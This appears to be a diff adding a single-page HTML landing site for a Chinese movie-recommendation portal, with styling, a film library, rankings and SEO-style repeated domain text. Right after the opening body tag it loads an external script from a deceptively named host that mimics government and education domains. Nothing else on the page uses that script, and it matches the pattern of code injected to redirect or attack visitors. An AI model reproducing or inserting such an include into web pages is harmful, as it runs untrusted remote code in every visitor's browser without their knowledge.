@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>皮皮电影网 - 在线影视推荐与影片库 | pipidianyingwang-app</title>
+  <meta name="description" content="皮皮电影网是聚合电影推荐、热播影片、排行榜与影评资讯的在线平台，官网地址 https://pipidianyingwang-app，手机电脑都能看。" />
+  <meta name="keywords" content="皮皮电影网, 电影推荐, 在线电影, 影片库, pipidianyingwang-app" />
+  <meta name="robots" content="index,follow" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    html {
+      scroll-behavior: smooth;
+    }
+    body {
+      font-family: "PingFang SC", "Microsoft YaHei", system-ui, sans-serif;
+      background: #0b0f1a;
+      color: #e8edf7;
+      line-height: 1.7;
+      overflow-x: hidden;
+    }
+    a {
+      color: inherit;
+      text-decoration: none;
+    }
+    .glow {
+      position: fixed;
+      width: 420px;
+      height: 420px;
+      filter: blur(120px);
+      opacity: 0.55;
+      z-index: 0;
+      pointer-events: none;
+    }
+    .glow.one {
+      top: -120px;
+      left: -120px;
+      background: #ff4d8d;
+    }
+    .glow.two {
+      bottom: -140px;
+      right: -120px;
+      background: #4d7cff;
+    }
+    header {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      backdrop-filter: blur(14px);
+      background: rgba(11, 15, 26, 0.72);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+    }
+    .nav {
+      max-width: 1180px;
+      margin: 0 auto;
+      padding: 16px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .logo {
+      font-size: 22px;
+      font-weight: 800;
+      background: linear-gradient(90deg, #ff4d8d, #ffb84d, #4d7cff);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+    .menu {
+      display: flex;
+      gap: 18px;
+      flex-wrap: wrap;
+    }
+    .menu a {
+      padding: 8px 14px;
+      border-radius: 999px;
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      font-size: 14px;
+      transition: 0.25s;
+    }
+    .menu a:hover {
+      background: rgba(255, 255, 255, 0.08);
+      border-color: rgba(255, 255, 255, 0.28);
+    }
+    section {
+      position: relative;
+      z-index: 1;
+      max-width: 1180px;
+      margin: 0 auto;
+      padding: 76px 20px;
+    }
+    .hero {
+      text-align: center;
+      padding-top: 110px;
+      padding-bottom: 90px;
+    }
+    .hero h1 {
+      font-size: clamp(34px, 6vw, 58px);
+      line-height: 1.2;
+      margin-bottom: 18px;
+    }
+    .hero p {
+      font-size: 17px;
+      color: #aab4c8;
+      max-width: 720px;
+      margin: 0 auto 28px;
+    }
+    .btn {
+      display: inline-block;
+      padding: 13px 28px;
+      border-radius: 999px;
+      font-weight: 700;
+      background: linear-gradient(90deg, #ff4d8d, #4d7cff);
+      color: #fff;
+      box-shadow: 0 12px 30px rgba(77, 124, 255, 0.35);
+    }
+    .url-box {
+      margin-top: 26px;
+      font-size: 14px;
+      color: #8b96ad;
+    }
+    h2.section-title {
+      font-size: 28px;
+      margin-bottom: 26px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    h2.section-title::before {
+      content: "";
+      width: 8px;
+      height: 26px;
+      border-radius: 4px;
+      background: linear-gradient(180deg, #ff4d8d, #4d7cff);
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 18px;
+    }
+    .card {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 18px;
+      padding: 22px;
+      transition: transform 0.25s, border-color 0.25s, background 0.25s;
+    }
+    .card:hover {
+      transform: translateY(-6px);
+      border-color: rgba(255, 255, 255, 0.22);
+      background: rgba(255, 255, 255, 0.07);
+    }
+    .card h3 {
+      font-size: 18px;
+      margin-bottom: 8px;
+    }
+    .card p {
+      font-size: 14px;
+      color: #aab4c8;
+    }
+    .rank-list {
+      display: grid;
+      gap: 12px;
+    }
+    .rank-item {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      padding: 16px 18px;
+      border-radius: 14px;
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+    }
+    .rank-no {
+      width: 36px;
+      height: 36px;
+      border-radius: 10px;
+      display: grid;
+      place-items: center;
+      font-weight: 800;
+      background: linear-gradient(135deg, #ff4d8d, #ffb84d);
+      color: #0b0f1a;
+    }
+    .about p {
+      color: #c2cad9;
+      margin-bottom: 14px;
+    }
+    .contact-card {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 18px;
+      padding: 28px;
+    }
+    .contact-card a {
+      color: #7ea2ff;
+    }
+    footer {
+      position: relative;
+      z-index: 1;
+      text-align: center;
+      padding: 30px 20px 40px;
+      color: #7c869c;
+      font-size: 13px;
+      border-top: 1px solid rgba(255, 255, 255, 0.06);
+    }
+    @media (max-width: 860px) {
+      .grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+    }
+    @media (max-width: 560px) {
+      .menu {
+        gap: 8px;
+      }
+      .menu a {
+        padding: 7px 10px;
+        font-size: 13px;
+      }
+      .grid {
+        grid-template-columns: 1fr;
+      }
+      section {
+        padding: 56px 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+  <div class="glow one"></div>
+  <div class="glow two"></div>
+
+  <header>
+    <div class="nav">
+      <div class="logo">皮皮电影网</div>
+      <nav class="menu">
+        <a href="#home">首页</a>
+        <a href="#library">影片库</a>
+        <a href="#rank">排行榜</a>
+        <a href="#about">关于我们</a>
+        <a href="#contact">联系我们</a>
+      </nav>
+    </div>
+  </header>
+
+  <section id="home" class="hero">
+    <h1>皮皮电影网 · 一站式发现好电影</h1>
+    <p>
+      皮皮电影网聚合热门电影、剧集、动画与影评资讯，帮你快速找到今晚该看什么。
+      官网地址：https://pipidianyingwang-app
+    </p>
+    <a class="btn" href="#library">立即逛片库</a>
+    <div class="url-box">网站名称：皮皮电影网 ｜ 网站网址：https://pipidianyingwang-app</div>
+  </section>
+
+  <section id="library">
+    <h2 class="section-title">影片库</h2>
+    <div class="grid">
+      <div class="card">
+        <h3>热映电影</h3>
+        <p>汇总院线与流媒体正在热播的大片、文艺片、悬疑片，更新及时。</p>
+      </div>
+      <div class="card">
+        <h3>经典老片</h3>
+        <p>IMDb 高分、豆瓣神作、导演代表作，适合周末慢慢刷。</p>
+      </div>
+      <div class="card">
+        <h3>动漫动画</h3>
+        <p>国漫、日番、欧美动画全品类整理，附观看顺序与避坑提醒。</p>
+      </div>
+      <div class="card">
+        <h3>纪录片</h3>
+        <p>自然、历史、商业、人物传记，皮皮电影网帮你挑有信息量的片子。</p>
+      </div>
+      <div class="card">
+        <h3>短剧合集</h3>
+        <p>节奏快、反转多，适合通勤和碎片时间一口气看完。</p>
+      </div>
+      <div class="card">
+        <h3>影评解读</h3>
+        <p>不止讲剧情，还讲镜头、隐喻、改编逻辑与彩蛋。</p>
+      </div>
+    </div>
+  </section>
+
+  <section id="rank">
+    <h2 class="section-title">排行榜</h2>
+    <div class="rank-list">
+      <div class="rank-item">
+        <div class="rank-no">1</div>
+        <div>
+          <h3>本周最热：都市悬疑巨制</h3>
+          <p>高能反转 + 强卡司，皮皮电影网用户点击量第一。</p>
+        </div>
+      </div>
+      <div class="rank-item">
+        <div class="rank-no">2</div>
+        <div>
+          <h3>口碑黑马：小成本治愈片</h3>
+          <p>没大宣发但评分猛涨，适合一个人安静看。</p>
+        </div>
+      </div>
+      <div class="rank-item">
+        <div class="rank-no">3</div>
+        <div>
+          <h3>动画天花板：史诗续作</h3>
+          <p>画面、配乐、世界观全线升级，粉丝直呼回本。</p>
+        </div>
+      </div>
+      <div class="rank-item">
+        <div class="rank-no">4</div>
+        <div>
+          <h3>怀旧专场：千禧年港片</h3>
+          <p>江湖、爱情、无厘头，老片新看别有一番味道。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="about" class="about">
+    <h2 class="section-title">关于我们</h2>
+    <p>
+      皮皮电影网（https://pipidianyingwang-app）是一个面向普通观众的影视导航与推荐站点，
+      不玩花哨概念，只做一件事：让你少花时间找片，多花时间看好片。
+    </p>
+    <p>
+      我们人工筛片 + 数据排榜，覆盖电影、剧集、动画、纪录片和短剧，
+      页面移动端自适应，加载轻、结构清，方便搜索引擎理解内容。
+    </p>
+    <p>
+      无论你用手机、平板还是电脑访问皮皮电影网，都能获得一致的浏览体验。
+    </p>
+  </section>
+
+  <section id="contact">
+    <h2 class="section-title">联系我们</h2>
+    <div class="contact-card">
+      <p>合作 / 荐片 / 纠错：<a href="#">#</a></p>
+      <p>官网：<a href="https://pipidianyingwang-app">https://pipidianyingwang-app</a></p>
+      <p>商务邮箱：<a href="#">business@pipidianyingwang-app</a></p>
+      <p>更多入口：<a href="#">关于站点</a> ｜ <a href="#">投稿规则</a> ｜ <a href="#">隐私说明</a></p>
+    </div>
+  </section>
+
+  <footer>
+    © 2026 皮皮电影网 ｜ 网站网址：https://pipidianyingwang-app ｜ 本页为单页演示，内链使用 # 占位
+  </footer>
+</body>
+</html>
